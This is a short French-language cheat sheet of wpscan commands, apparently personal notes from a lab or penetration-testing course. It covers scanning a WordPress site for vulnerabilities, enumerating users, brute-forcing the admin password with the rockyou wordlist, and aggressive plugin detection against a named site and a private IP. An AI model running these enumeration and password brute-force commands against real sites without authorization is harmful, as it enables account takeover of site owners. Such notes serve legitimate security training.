### checher les vulnérabilité du site :
```
$ wpscan --url http://alvida-eatery.org/
```
### Lister les utilisateurs du site :
```
$ wpscan --url http://alvida-eatery.org/ --enumerate u

```
### Chercher le mot de passe d'un site Wordpress avec un seul utilisateur
```
$ wpscan --url http://alvida-eatery.org/ -U admin -P /usr/share/wordlists/rockyou.txt

```

### Chercher les plugin de Wordpress
```bash
wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```
